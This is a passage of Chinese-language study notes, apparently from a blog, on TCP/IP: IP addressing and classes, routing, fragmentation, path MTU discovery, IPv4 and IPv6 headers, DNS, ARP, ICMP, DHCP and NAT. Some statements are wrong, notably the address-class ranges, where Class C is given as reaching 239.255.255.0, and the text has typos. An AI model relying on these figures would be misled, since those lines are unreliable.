网络层与数据链路层的关系</h3><p>数据链路层提供直连两个设备之间的通信功能。与之相比，作为网络层的IP则负责在没有直连的两个网络之间进行通信传输。以旅行为例：</p><img src="/2023/08/06/TCP-IP/image-20230808001929348.png" class title="image-20230808001929348"><h2 id="4-2-IP基础知识"><a href="#4-2-IP基础知识" class="headerlink" title="4.2 IP基础知识"></a>4.2 IP基础知识</h2><p>本章我们来学习IP（Internet Protocol，网际协议）。IP作为整个TCP&#x2F;IP中至关重要的协议，主要负责将数据包发送给最终的目标计算机。因此，IP能够让世界上任何两台计算机之间进行通信。本章旨在详细介绍IP协议的主要功能及其规范。</p><p>IP大致分为三大作用模块：IP寻址、路由（最终节点为止的转发）以及IP分包与组包。</p><h3 id="4-2-1-IP地址属于网络层地址"><a href="#4-2-1-IP地址属于网络层地址" class="headerlink" title="4.2.1 IP地址属于网络层地址"></a>4.2.1 IP地址属于网络层地址</h3><p>在数据链路中MAC地址是用来标识同一个链路中的不同计算机的一种识别码，而网络层的IP也有这种地址信息，叫做IP地址。IP地址用于在“连接到网络中的所有主机中识别出进行通信的目标地址”。因此，在TCP&#x2F;IP通信中所有主机或路由器必须设定自己的IP地址。</p><h3 id="4-2-2-路由控制"><a href="#4-2-2-路由控制" class="headerlink" title="4.2.2 路由控制"></a>4.2.2 路由控制</h3><p>路由控制（Routing）是指将分组数据发送到最终目标地址的功能。一个数据包之所以能够成功的到达最终的目标地址，全靠路由控制。</p><p>发送数据至最终目标地址<br>“跳”是指网络中的一个区间。IP路由也叫多跳路由，在每个区间内决定着包在下一跳被转发的路径。</p><p>多跳路由是指路由器或主机在转发IP数据包时只指定下一个路由器或主机，而不是将到最终目标地址为止的所有通路全都指出来。如图4.6，以乘坐火车旅游为例：</p><img src="/2023/08/06/TCP-IP/image-20230808002018577.png" class title="image-20230808002018577"><p><strong>路由控制表</strong><br>为了将数据包发送给目标主机，所有主机都维护着一张路由控制表（Routing Table）。该表记录IP数据在下一步应该发送给哪个路由器。IP包将根据这个路由表在各个数据链路上传输。</p><img src="/2023/08/06/TCP-IP/image-20230808002046068.png" class title="image-20230808002046068"><h3 id="4-2-3-数据链路的抽象化"><a href="#4-2-3-数据链路的抽象化" class="headerlink" title="4.2.3 数据链路的抽象化"></a>4.2.3 数据链路的抽象化</h3><p>不同数据链路有个最大的区别，就是它们各自的最大传输单位（MTU）不同。如图4.9展示：</p><img src="/2023/08/06/TCP-IP/image-20230808002107278.png" class title="image-20230808002107278"><p>MTU的值在以太网中是1500字节，在FDDI中是4352字节，而ATM则为9180字。IP的上一层可能会要求传送比这些MTU更多字节的数据，因此必须在线路上传送比包长还要小的MTU。</p><p>为了解决这个问题，IP进行分片处理，就是将较大的IP包分成多个较小的IP包。分片的包到了对端目标地址以后会再被组合起来传给上一层。即从IP的上次层来看，它完全可以忽略数据包在途中的各个数据链路上的MTU，而只需按照源地址发送的长度接收数据包。</p><h3 id="4-2-4-IP属于面向无连接型"><a href="#4-2-4-IP属于面向无连接型" class="headerlink" title="4.2.4 IP属于面向无连接型"></a>4.2.4 IP属于面向无连接型</h3><p>采用面向无连接的原因一是为了简化，二是为了提速。面向连接比起面向无连接处理相对复杂。每次通信之前都要事先建立连接，降低了处理速度。</p><p>为了提高可靠性，上一层的TCP采用面向有连接型。</p><h2 id="4-3-IP地址的基础知识"><a href="#4-3-IP地址的基础知识" class="headerlink" title="4.3 IP地址的基础知识"></a>4.3 IP地址的基础知识</h2><h3 id="4-3-1-IP地址的定义"><a href="#4-3-1-IP地址的定义" class="headerlink" title="4.3.1 IP地址的定义"></a>4.3.1 IP地址的定义</h3><p>IP地址（IPv4地址）由32位正整数来表示。IP地址在计算机内部以二进制方式被处理。将32位的IP地址以每8位为一组，分成4组，每组以“.”隔开，再将每组数转换成十进制数。如：</p><img src="/2023/08/06/TCP-IP/image-20230808002233619.png" class title="image-20230808002233619"><h2 id="4-3-2-IP地址由网络和主机两部分标识组成"><a href="#4-3-2-IP地址由网络和主机两部分标识组成" class="headerlink" title="4.3.2 IP地址由网络和主机两部分标识组成"></a>4.3.2 IP地址由网络和主机两部分标识组成</h2><p>如图4.11，网络标识在数据链路的每个段配置不同的值。网络标识必须保证相互连接的每个段的地址不相重复。而相同段内相连的主机必须有相同的网络地址。</p><p>IP地址的“主机标识”则不允许在同一个网段内重复出现。由此，可以通过设置网络地址和主机地址，在相互连接的整个网络中保证每台主机的IP地址都不会相互重叠。即IP地址具有了唯一性。</p><img src="/2023/08/06/TCP-IP/image-20230808002301653.png" class title="image-20230808002301653"><p>如图4.12所示，IP包被转发到途中某个路由器时，正是利用目标IP地址的网络标识进行路由。</p><img src="/2023/08/06/TCP-IP/image-20230808002319361.png" class title="image-20230808002319361"><h3 id="4-3-3-IP地址的分类"><a href="#4-3-3-IP地址的分类" class="headerlink" title="4.3.3 IP地址的分类"></a>4.3.3 IP地址的分类</h3><p>IP地址分为四个等级，分别为A类、B类、C类、D类。它根据IP地址中从第1位到第4位的比特列对其网络标识和主机标识进行区分。</p><p>A类地址：<br>A类地址：0.0.0.0~127.0.0.0是A类地址的网络地址。A类地址的后24位相当于主机标识。</p><p>B类地址：<br>B类地址：128.0.0.1~191.255.0.0是B类地址的网络地址。B类地址的后16位相当于主机标识。</p><p>C类地址：<br>C类地址：192.168.0.0~239.255.255.0是C类地址的网络地址。C类地址的后8位相当于主机标识。</p><p>D类地址：<br>D类地址：224.0.0.0~239.255.255.255是D类地址的网络地址。D类地址没有主机标识，常被用于多播。</p><p>关于分配IP主机地址的注意事项<br>主机地址不可以全为0或全为1，因为只有0在表示对应的网络地址或IP地址不可获知的情况下才使用。全为1的主机地址通常作为广播地址。</p><h3 id="4-3-4-广播地址"><a href="#4-3-4-广播地址" class="headerlink" title="4.3.4 广播地址"></a>4.3.4 广播地址</h3><p>广播地址用于在同一个链路中相互连接的主机之间发送数据包。</p><p>两种广播： 本地广播和直接广播。<br>本地广播：在本网络内的广播叫做本地广播。例如网络地址为192.168.0.0&#x2F;24的情况下，广播地址是192.168.0.255。因为这个广播地址会的IP包会被路由器屏蔽，所以不会到达192.168.0.0&#x2F;24以外的其他链路上。</p><p>直接广播：在不同网络之间的广播叫做直接广播。例如网络地址为192.168.0.0&#x2F;24的主机向192.168.1.255&#x2F;24的目标地址发送IP包。收到这个包的路由器，将数据转发给192.168.1.255&#x2F;24，从而使得所有192.168.1.1~192.168.1.254的主机都能接收到这个包。</p><img src="/2023/08/06/TCP-IP/image-20230808002347436.png" class title="image-20230808002347436"><h3 id="4-3-5-IP多播"><a href="#4-3-5-IP多播" class="headerlink" title="4.3.5 IP多播"></a>4.3.5 IP多播</h3><p>多播用于将包发送给特定组内的所有主机。由于其直接使用IP地址，因此也不存在可靠传输。多播既可以穿透路由器（广播不可以），又可以实现只给那些必要的组发送数据包。</p><img src="/2023/08/06/TCP-IP/image-20230808002407313.png" class title="image-20230808002407313"><p><strong>IP多播与地址</strong><br>多播使用D类地址。因此，如果从首位开始到第4位是“1110”，就可以认为是多播地址。而剩下的28位可以成为多播的组编号。</p><img src="/2023/08/06/TCP-IP/image-20230808002424633.png" class title="image-20230808002424633"><p>从224.0.0.0到239.255.255.255都是多播地址的可用范围。其中从224.0.0.0到224.0.0.255的范围不需要路由控制，在同一个链路内也能实现多播。而在这个范围之外设置多播地址会给全网所有组内成员发送多播的包。</p><p>此外，对于多播，所有的主机（路由器意外的主机和终端主机）必须属于224.0.0.1的组，所有的路由器必须属于224.0.0.2的组。</p><h3 id="4-3-6-子网掩码"><a href="#4-3-6-子网掩码" class="headerlink" title="4.3.6 子网掩码"></a>4.3.6 子网掩码</h3><p>子网与子网掩码<br>这种方式实际上就是将原来的A类、B类、C类等分类中的主机地址部分用作子网地址，可以将原网络分为多个物理网络的一种机制。</p><p>自从引入子网以后，一个IP地址就有了两种识别码。一是IP地址本身，另一个是表示网络部的子网掩码。子网掩码对应IP地址网络标识部分的位全部为“1”，对应IP地址主机标识的部分全部为“0”。子网掩码必须是IP地址的首位开始连续的“1”。</p><p>以172.20.100.52是网络地址的情况为例：</p><img src="/2023/08/06/TCP-IP/image-20230808002514388.png" class title="image-20230808002514388"><h3 id="4-3-8-全局地址与私有地址"><a href="#4-3-8-全局地址与私有地址" class="headerlink" title="4.3.8 全局地址与私有地址"></a>4.3.8 全局地址与私有地址</h3><p>私有网络的IP地址范围如下：</p><img src="/2023/08/06/TCP-IP/image-20230808002546561.png" class title="image-20230808002546561"><p>如果配有私有IP的地址主机联网时，则通过NAT进行通信。</p><img src="/2023/08/06/TCP-IP/image-20230808002606055.png" class title="image-20230808002606055"><h2 id="4-4-路由控制"><a href="#4-4-路由控制" class="headerlink" title="4.4 路由控制"></a>4.4 路由控制</h2><h3 id="4-4-1-IP地址与路由控制"><a href="#4-4-1-IP地址与路由控制" class="headerlink" title="4.4.1 IP地址与路由控制"></a>4.4.1 IP地址与路由控制</h3><p>路由控制表中记录着网络地址与下一步应该发送至路由器的地址。在发送IP包时，首先要确定IP包首部中的目标地址，再从路由控制表中找到与该地址具有相同网络地址的记录，根据该记录将IP包转发给相应的下一个路由器。如果路由控制表中存在多条相同网络地址的记录，就选择一个最为吻合的网络地址，所谓最为吻合是指相同位数最多的意思。<br>主机路由<br>例如，192.168.153.15&#x2F;32就是一种主机路由。它的意思是整个IP地址的所有位都将参与路由。<br>环回地址<br>127.0.0.1&#x2F;localhost，使用这个IP或主机名时，数据包不会流向网络。</p><h3 id="4-4-2-路由控制表的聚合"><a href="#4-4-2-路由控制表的聚合" class="headerlink" title="4.4.2 路由控制表的聚合"></a>4.4.2 路由控制表的聚合</h3><img src="/2023/08/06/TCP-IP/image-20230808002636940.png" class title="image-20230808002636940"><h2 id="4-5-IP分割处理与再构成处理"><a href="#4-5-IP分割处理与再构成处理" class="headerlink" title="4.5 IP分割处理与再构成处理"></a>4.5 IP分割处理与再构成处理</h2><h3 id="4-5-2-IP报文的分片与重组"><a href="#4-5-2-IP报文的分片与重组" class="headerlink" title="4.5.2 IP报文的分片与重组"></a>4.5.2 IP报文的分片与重组</h3><p>图4.24展示了网络传输过程中进行分片处理的一个例子。</p><img src="/2023/08/06/TCP-IP/image-20230808002705006.png" class title="image-20230808002705006"><p>经过分片后的IP数据报在被重组的时候，只能有目标主机进行。路由器虽然做分片但不会进行重组。因为即使在途中某一处被重组，但如果下一站再经过其他路由是还会面临被分片的可能。这会给路由器带来多余的负担，也会降低网络传送效率。</p><h3 id="4-5-3-路径MTU发现"><a href="#4-5-3-路径MTU发现" class="headerlink" title="4.5.3 路径MTU发现"></a>4.5.3 路径MTU发现</h3><p>分片机制的不足：</p><p>路由器的处理负荷加重。<br>在分片处理中，一旦某个分片丢失，则会造成整个IP数据报作废。<br>如果使用更小的分片进行传输，会导致网路的利用率明显下降。<br>为了应对以上问题，产生了“路径MTU发现”（Path MTU Discovery）。所谓路径MTU发现是指从发送端到接收端主机之间不需要分片时最大MTU的大小。即路径中存在的所有数据链路中最小的MTU。</p><p>路径MTU发现工作原理：</p><p>首先在发送端主机发送IP数据报时将其首部的分片禁止标志位设置为1。根据这个标志位，途中的路由器即使遇到需要分片才能处理的大包，也不会去分片，而是将包丢弃。随后，通过一个ICMP的不可达消息将数据链路上MTU的值发送给主机。</p><p>下一次，从发送给同一个目标主机的IP报获得ICMP所通知的MTU值以后吗，将它设置为当前MTU。</p><p>路径MTU发现的机制（UDP）： IP层负责分片！</p><img src="/2023/08/06/TCP-IP/image-20230808002731671.png" class title="image-20230808002731671"><p><strong>路径MTU发现的机制（TCP）：</strong> TCP负责分片，IP层不分片！！</p><img src="/2023/08/06/TCP-IP/image-20230808002753716.png" class title="image-20230808002753716"><h2 id="4-6-IPv6"><a href="#4-6-IPv6" class="headerlink" title="4.6 IPv6"></a>4.6 IPv6</h2><p>IPv6的特点</p><h4 id="1-IP地址的扩大与路由控制表的聚合"><a href="#1-IP地址的扩大与路由控制表的聚合" class="headerlink" title="1.IP地址的扩大与路由控制表的聚合"></a>1.IP地址的扩大与路由控制表的聚合</h4><p>IP地址依然适应互联网分层构造。分配与其地址结构相适应的IP地址，尽可能避免路由表膨大。</p><h4 id="2-性能提升"><a href="#2-性能提升" class="headerlink" title="2.性能提升"></a>2.性能提升</h4><p>包首部长度采用固定的值（40字节），不再采用首部检验码。简化首部结构，减轻路由器负荷。路由器不再做分片处理（通过路径MTU发现只由发送端主机进行分片处理）。</p><h4 id="3-支持即插即用功能"><a href="#3-支持即插即用功能" class="headerlink" title="3.支持即插即用功能"></a>3.支持即插即用功能</h4><p>即使没有DHCP服务器也可以实现自动分配IP地址。</p><h4 id="4-采用认证与加密功能"><a href="#4-采用认证与加密功能" class="headerlink" title="4.采用认证与加密功能"></a>4.采用认证与加密功能</h4><h4 id="5-多播、Mobile-IP成为扩展功能"><a href="#5-多播、Mobile-IP成为扩展功能" class="headerlink" title="5.多播、Mobile IP成为扩展功能"></a>5.多播、Mobile IP成为扩展功能</h4><h2 id="4-7-IPv4首部"><a href="#4-7-IPv4首部" class="headerlink" title="4.7 IPv4首部"></a>4.7 IPv4首部</h2><h4 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h4><p>由4比特构成。</p><h4 id="首部长度"><a href="#首部长度" class="headerlink" title="首部长度"></a>首部长度</h4><p>由4比特构成，标识IP首部的大小，单位为4字节。</p><h4 id="区分服务"><a href="#区分服务" class="headerlink" title="区分服务"></a>区分服务</h4><h4 id="总长度"><a href="#总长度" class="headerlink" title="总长度"></a>总长度</h4><p>由16比特构成。</p><h4 id="标识（ID）"><a href="#标识（ID）" class="headerlink" title="标识（ID）"></a>标识（ID）</h4><p>由16比特构成，用于分片重组。同一个分片的标识值相同。通常，每发送一个IP包，它的值也逐渐增加。此外，即使ID相同，如果目标地址、源地址或协议不同的话也认为是不同的分片。</p><h4 id="标志（Flags）"><a href="#标志（Flags）" class="headerlink" title="标志（Flags）"></a>标志（Flags）</h4><p>由3比特构成。</p><img src="/2023/08/06/TCP-IP/image-20230808002927010.png" class title="image-20230808002927010"><h5 id="片偏移（FO）"><a href="#片偏移（FO）" class="headerlink" title="片偏移（FO）"></a>片偏移（FO）</h5><p>由13比特构成，用来标识被分片的每一个分段相对于原始数据的位置。由于FO域占13位，因此最多可以表示8192（&#x3D;2^13）个相对位置。单位为8字节，因此最大可表示原始数据8 x 8192 &#x3D; 65536字节的位置。</p><h5 id="生存时间（TTL）"><a href="#生存时间（TTL）" class="headerlink" title="生存时间（TTL）"></a>生存时间（TTL）</h5><p>由8比特构成，实际中是指可以中转多少个路由器，每经过一个路由器TTL就减1，直到变成0则丢弃该包。</p><h5 id="协议"><a href="#协议" class="headerlink" title="协议"></a>协议</h5><p>由8比特构成，标识IPO首部的下一个首部隶属于哪个协议。</p><h5 id="首部校验和"><a href="#首部校验和" class="headerlink" title="首部校验和"></a>首部校验和</h5><p>由16比特（2个字节）构成，也叫IP首部校验和。该字段只校验数据报的首部，不校验数据部分。它主要用来确保IP数据报不被破坏。校验和的计算过程，首先要将该校验和的所有位置置0，然后以16比特为单位划分IP首部，并用1补救所有的16位字的和。最后将所得到的这个和的1补救赋给首部校验和字段。</p><h5 id="源地址"><a href="#源地址" class="headerlink" title="源地址"></a>源地址</h5><p>由32比特（4个字节）构成。</p><h5 id="目标地址"><a href="#目标地址" class="headerlink" title="目标地址"></a>目标地址</h5><p>由32比特（4个字节）构成。</p><h5 id="可选项"><a href="#可选项" class="headerlink" title="可选项"></a>可选项</h5><p>长度可变。</p><h5 id="填充"><a href="#填充" class="headerlink" title="填充"></a>填充</h5><h5 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h5><img src="/2023/08/06/TCP-IP/image-20230808003031201.png" class title="image-20230808003031201"><h2 id="4-8-IPv6首部格式"><a href="#4-8-IPv6首部格式" class="headerlink" title="4.8 IPv6首部格式"></a>4.8 IPv6首部格式</h2><p>IPv6中为了减少路由器的负担，省略了首部校验和字段。因此路由器不再需要计算校验和，从而也提高了包的转发效率。</p><img src="/2023/08/06/TCP-IP/image-20230808003102947.png" class title="image-20230808003102947"><h5 id="版本-1"><a href="#版本-1" class="headerlink" title="版本"></a>版本</h5><p>由4比特构成。</p><h5 id="通信量类"><a href="#通信量类" class="headerlink" title="通信量类"></a>通信量类</h5><p>由8比特构成。</p><h5 id="流标号"><a href="#流标号" class="headerlink" title="流标号"></a>流标号</h5><p>由20比特构成。</p><h5 id="有效载荷长度"><a href="#有效载荷长度" class="headerlink" title="有效载荷长度"></a>有效载荷长度</h5><p>有效载荷是指包的数据部分，不包含首部。</p><h5 id="下一个首部"><a href="#下一个首部" class="headerlink" title="下一个首部"></a>下一个首部</h5><h5 id="跳数限制（Hop-Limit）"><a href="#跳数限制（Hop-Limit）" class="headerlink" title="跳数限制（Hop Limit）"></a>跳数限制（Hop Limit）</h5><p>由8比特构成。</p><h5 id="源地址-1"><a href="#源地址-1" class="headerlink" title="源地址"></a>源地址</h5><h5 id="目标地址-1"><a href="#目标地址-1" class="headerlink" title="目标地址"></a>目标地址</h5><h5 id="扩展首部"><a href="#扩展首部" class="headerlink" title="扩展首部"></a>扩展首部</h5><p>扩展首部通常介于IPv6首部与TCP&#x2F;IP首部之间。</p><img src="/2023/08/06/TCP-IP/image-20230808003153180.png" class title="image-20230808003153180"><h1 id="第5章-IP协议相关技术"><a href="#第5章-IP协议相关技术" class="headerlink" title="第5章 IP协议相关技术"></a>第5章 IP协议相关技术</h1><p>IP（Internet Protocol）旨在让最终目标主机收到数据包，但是在这一过程中仅仅有IP是无法实现通信的。必须还有能够解析主机名称和MAC地址的功能，以及数据包在发送过程中异常情况处理的功能。此外，还会涉及IP必不可少的其他功能。</p><p>本章主要介绍作为IP的辅助和扩展规范的DNS、ARP、ICMP以及DHCP等协议。</p><h2 id="5-2-DNS"><a href="#5-2-DNS" class="headerlink" title="5.2 DNS"></a>5.2 DNS</h2><p>可以有效管理主机名和IP地址之间对应关系的系统，那就是DNS。在这个系统中主机的管理机构可以对数据进行变更和设定。也就是说，它可以维护一个用来表示组织内部主机名和IP地址之间对应关系的数据库。</p><h3 id="5-2-4-DNS查询"><a href="#5-2-4-DNS查询" class="headerlink" title="5.2.4 DNS查询"></a>5.2.4 DNS查询</h3><img src="/2023/08/06/TCP-IP/image-20230808003248407.png" class title="image-20230808003248407"><p>解析器（进行DNS查询的主机和软件叫做DNS解析器，如工作站或个人电脑）为了调查IP地址，向域名服务器进行查询处理。接收这个查询请求的域名服务器首先在自己的数据库进行查找。如果有该域名所对应的IP地址就返回。如果没有，则域名服务器再向上一层根域名服务器进行查询处理。</p><p>解析器和域名服务器将最新了解到的信息暂时保存在缓存中。这样，可以减少每次查询时的性能消耗。</p><h2 id="5-3-ARP"><a href="#5-3-ARP" class="headerlink" title="5.3 ARP"></a>5.3 ARP</h2><h3 id="5-3-1-ARP概要"><a href="#5-3-1-ARP概要" class="headerlink" title="5.3.1 ARP概要"></a>5.3.1 ARP概要</h3><p>ARP是一种解决地址问题的协议。以目标IP地址为线索，用来定位下一个应该接收数据分包的网络设备对应的MAC地址。如果目标主机不在同一个链路上时，可以通过ARP查找下一跳路由器的MAC地址。不过ARP只适用于IPv4，IPv6可以用ICMPv6代替ARP发送邻居探索消息。</p><h3 id="5-3-2-ARP的工作原理"><a href="#5-3-2-ARP的工作原理" class="headerlink" title="5.3.2 ARP的工作原理"></a>5.3.2 ARP的工作原理</h3><p>ARP是借助ARP请求与ARP响应两种类型的包确定MAC地址的。</p><img src="/2023/08/06/TCP-IP/image-20230808003317024.png" class title="image-20230808003317024"><p>如图5.6，主机A为了获得主机B的MAC地址，起初要通过广播发送一个ARP请求包。这个包中包含了想要了解其MAC地址的主机IP地址。也就是说，ARP请求包中已经包含了主机B的IP地址172.20.1.2。ARP的请求包会被这同一个链路上的所有主机或路由器接收，如果ARP请求包中的目标IP地址与自己的IP地址一致，那么这个节点就将自己的MAC地址塞入ARP响应包返回给主机A。</p><p>总之，从一个IP地址发送ARP请求以了解其MAC地址，目标地址将自己的MAC地址填入其中的ARP响应包返回到IP地址。由此，可以通过ARP从IP地址获得MAC地址，实现链路内的IP通信。</p><p>如果每发送一个IP数据报都有进行一次ARP请求以确定MAC地址，那将会造成不必要的网络流量，因此，通常的做法是把获取到的MAC地址缓存一段时间。 在发送主机端和接收主机端缓存MAC地址也是一种提高效率的方法。</p><h5 id="ARP包格式"><a href="#ARP包格式" class="headerlink" title="ARP包格式"></a>ARP包格式</h5><img src="/2023/08/06/TCP-IP/image-20230808003345863.png" class title="image-20230808003345863"><h3 id="5-3-3-IP地址与MAC地址缺一不可"><a href="#5-3-3-IP地址与MAC地址缺一不可" class="headerlink" title="5.3.3 IP地址与MAC地址缺一不可"></a>5.3.3 IP地址与MAC地址缺一不可</h3><h4 id="一、有了mac为什么还需要ip"><a href="#一、有了mac为什么还需要ip" class="headerlink" title="一、有了mac为什么还需要ip"></a>一、有了mac为什么还需要ip</h4><p>有唯一mac固然可以寻址，但是却不方便。mac地址是出厂自带的，至于后续设备到了哪里都是不可控的，所以mac没有规律可循。就好像快递员只用身份证号找人，由于人口是流动的，不一定就待在身份证号上的户籍地址，所以寻找难度过大。ip的优势正在于此。因为ip地址是可变的，且分为网络地址和主机地址，每一个接入网络的设备由DHCP服务器自动分配ip地址，同一个子网中的ip前几位是一样的，空间上靠近的设备ip前几位一样大大方便了寻址过程，再也不用满世界去找了，可以先找到子网，再在子网内找设备。</p><h4 id="二、有了ip为什么还需要mac"><a href="#二、有了ip为什么还需要mac" class="headerlink" title="二、有了ip为什么还需要mac"></a>二、有了ip为什么还需要mac</h4><p>（1）ip地址不是与生俱来，需要在接入网络后设备发送广播请求ip，DHCP服务器收到请求发送一个空闲的ip，设备收到回复发送租用请求，最后DHCP发送消息表示租用成功。在这个过程中由于设备还没有ip地址，所以需要mac地址来标识自己。假如同时有两个没有mac的设备接入网络，同时请求ip，那么DHCP服务器将不能区分是收到了两个请求还是同一个请求收到了两遍。</p><p>（2）mac先于ip存在，tcp&#x2F;ip协议诞生之前就有五花八门的网络，互相之间协议不互通，mac就是其中一个，tcp&#x2F;ip在更高层次上将他们连接起来，至于底层是什么交由各自管理。后来mac接近一统江湖，但是大局已定，而且这样做并没有明显的缺点，如果改动反而是困难重重（ipv6比v4那么大的优势缺还是难以取代），所以便沿用早期设计。</p><h3 id="5-3-4-RARP"><a href="#5-3-4-RARP" class="headerlink" title="5.3.4 RARP"></a>5.3.4 RARP</h3><p>RARP是将ARP反过来，从MAC地址定位IP地址的一种协议。如图5.9</p><img src="/2023/08/06/TCP-IP/image-20230808003418280.png" class title="image-20230808003418280"><h3 id="5-3-5-代理ARP"><a href="#5-3-5-代理ARP" class="headerlink" title="5.3.5 代理ARP"></a>5.3.5 代理ARP</h3><p>通常ARP包会被路由器隔离，但是采用代理ARP（Proxy ARP）的路由器可以将ARP请求转发给邻近的网段。由此，两个以上网段的节点之间可以像在同一个网段中一样进行通信。</p><h2 id="5-4-ICMP"><a href="#5-4-ICMP" class="headerlink" title="5.4 ICMP"></a>5.4 ICMP</h2><h3 id="5-4-1-辅助IP的ICMP"><a href="#5-4-1-辅助IP的ICMP" class="headerlink" title="5.4.1 辅助IP的ICMP"></a>5.4.1 辅助IP的ICMP</h3><p>构架IP网络时需要注意两点：确定网络是否正常运行以及遇到异常时进行问题诊断。ICMP（Internet Control Message Protocol）网际控制报文协议，正时提供这类功能的一种协议。</p><p><strong>主要功能：</strong><br>1.确认IP包是否发送成功送达目标地址<br>2。通知在发送过程当中IP包被废弃的具体原因<br>3.改善网络设置等。<br>4.有了这些功能，就可以获取网络是否正常、设置是否有误以及设备有何异常等信息，从而便于进行网络上的问题诊断。</p><p>如图5.10，主机A向主机B发送了数据包，由于某种原因，途中的路由器2未能发现主机B的存在，这时，路由器2就会向主机A发送一个ICMP包，说明发往主机B的包未能成功。</p><p>ICMP的这种通知消息会使用IP进行发送。因此，从路由器2返回的ICMP包会按照往常的路由控制先经过路由器1再转发给主机A。收到该ICMP包的主机则分解ICMP的首部和数据域以后得知具体发送问题的原因。</p><img src="/2023/08/06/TCP-IP/image-20230808003519662.png" class title="image-20230808003519662"><p>ICMP的消息大致可分为两类：一类是<strong>通知出错原因的错误消息</strong>，另一类是<strong>用于诊断的查询消息</strong>。</p><p>ICMP消息类型：<img src="/2023/08/06/TCP-IP/image-20230808003546757.png" class title="image-20230808003546757"></p><h3 id="5-4-2-主要的ICMP消息"><a href="#5-4-2-主要的ICMP消息" class="headerlink" title="5.4.2 主要的ICMP消息"></a>5.4.2 主要的ICMP消息</h3><p><strong>ICMP目标不可达消息（类型3）</strong><br>IP路由器无法将IP数据包发送给目标地址时，会给发送端主机返回一个目标地址不可达的ICMP消息，并在这个消息中显示不可达的具体原因。如表5.3所示：</p><img src="/2023/08/06/TCP-IP/image-20230808003621251.png" class title="image-20230808003621251"><p><strong>ICMP重定向消息（类型5）</strong><br>如果路由器发现发送端主机使用了次优的路径发送数据，那么它会返回一个ICMP重定向的消息给这个主机。在这个消息中包含了最合适的路由信息和源数据。这主要发生在路由器持有更好的路由信息的情况下。路由器会通过这样的ICMP消息给发送端主机一个更合适的发送路由</p><img src="/2023/08/06/TCP-IP/image-20230808003644788.png" class title="image-20230808003644788"><h5 id="ICMP超时消息（类型11）"><a href="#ICMP超时消息（类型11）" class="headerlink" title="ICMP超时消息（类型11）"></a>ICMP超时消息（类型11）</h5><p>IP包中有一个字段叫做TTL（Time to Live，生存周期），它的值随着每经过一次路由器就会减1，直到减到0时该IP包会被丢弃。此时，IP路由器将会发送一个ICMP超时的消息给发送端主机，并通知该包已被丢弃。</p><p>设置IP包生存周期的主要目的，是为了在路由控制遇到问题发生循环状况时，避免IP包无休止地在网络上上被转发。此外，有时可以用TTL控制包的到达范围，例如设置一个较小的TTL值。</p><h5 id="ICMP回送消息（类型0、8）"><a href="#ICMP回送消息（类型0、8）" class="headerlink" title="ICMP回送消息（类型0、8）"></a>ICMP回送消息（类型0、8）</h5><p>用于进行通信的主机或路由器之间，判断所发送的数据包是否成功到达对端的一种消息。可以向对端主机发送回送请求的消息，也可以接收对端主机发回来的回送应答消息，网络上最常用的ping命令就是利用这个消息实现的。</p><h2 id="5-5-DHCP"><a href="#5-5-DHCP" class="headerlink" title="5.5 DHCP"></a>5.5 DHCP</h2><h3 id="5-5-1-DHCP实现即插即用"><a href="#5-5-1-DHCP实现即插即用" class="headerlink" title="5.5.1 DHCP实现即插即用"></a>5.5.1 DHCP实现即插即用</h3><p>为了实现自动设置IP地址、统一管理IP地址分配，就产生了DHCP协议。DHCP在IPv4和IPv6都可以使用。</p><img src="/2023/08/06/TCP-IP/image-20230808003734256.png" class title="image-20230808003734256"><h3 id="5-5-2-DHCP的工作机制"><a href="#5-5-2-DHCP的工作机制" class="headerlink" title="5.5.2 DHCP的工作机制"></a>5.5.2 DHCP的工作机制</h3><p>使用DHCP之前，首先要架构一台DHCP服务器。然后将DHCP所要分配的IP地址设置到服务器上。此外，还需要将响应的子网掩码、路由控制信息以及DNS服务器的地址等设置到服务器上。</p><p>关于从DHCP中获取IP地址的流程，以图5.17为例:</p><img src="/2023/08/06/TCP-IP/image-20230808003802599.png" class title="image-20230808003802599"><p>为了检查所要分配的IP地址以及已经分配了的IP地址是否可用，DHCP服务器或客户端必须具备以下功能：</p><h5 id="DHCP服务器"><a href="#DHCP服务器" class="headerlink" title="DHCP服务器"></a>DHCP服务器</h5><p>在分配IP地址前发送ICMP回送请求包，确定没有返回应答。</p><h5 id="DHCP客户端"><a href="#DHCP客户端" class="headerlink" title="DHCP客户端"></a>DHCP客户端</h5><p>针对从DHCP那里获得的IP地址发送ARP请求包，确认没有返回应答。</p><h3 id="5-5-3-DHCP中继代理"><a href="#5-5-3-DHCP中继代理" class="headerlink" title="5.5.3 DHCP中继代理"></a>5.5.3 DHCP中继代理</h3><p>一个企业或学校等大规模组织机构的网络环境当中，会有多个以太网（无线LAN）网段。在这种情况下，若要针对每个网段都设置DHCP服务器将会是个庞大的工程。</p><p>因此，在这类网络环境中，往往需要将DHCP统一管理。具体方法可以使用DHCP中继代理来实现。</p><p>DHCP客户端会向DHCP中继代理发送DHCP请求包，而DHCP中继代理在收到这个广播包以后再以单播的形式发给DHCP服务器。服务器端收到该包以后再向DHCP中继代理返回应答，并由DHCP中继代理将此包转发给DHCP客户端。由此，DHCP服务器即使不在同一个链路上也可以实现统一分配和管理IP地址。</p><h2 id="5-6-NAT"><a href="#5-6-NAT" class="headerlink" title="5.6 NAT"></a>5.6 NAT</h2><h3 id="5-6-1-NAT定义"><a href="#5-6-1-NAT定义" class="headerlink" title="5.6.1 NAT定义"></a>5.6.1 NAT定义</h3><p>NAT（Network Address Translator）是用于在本地网络中使用私有地址，在连接到互联网时转而使用全局IP地址的技术。除转换IP地址外，还出现了可以转换TCP、UDP端口号的NAPT。</p><h3 id="5-6-2-NAT的工作机制"><a href="#5-6-2-NAT的工作机制" class="headerlink" title="5.6.2 NAT的工作机制"></a>5.6.2 NAT的工作机制</h3><p>如图5.19所示</p><p>不包含端口号的转换方式（NAT）</p><img src="/2023/08/06/TCP-IP/image-20230808003848805.png" class title="image-20230808003848805"><p>包含端口号的转换方式（NAPT）</p><img src="/2023/08/06/TCP-IP/image-20230808003910363.png" class 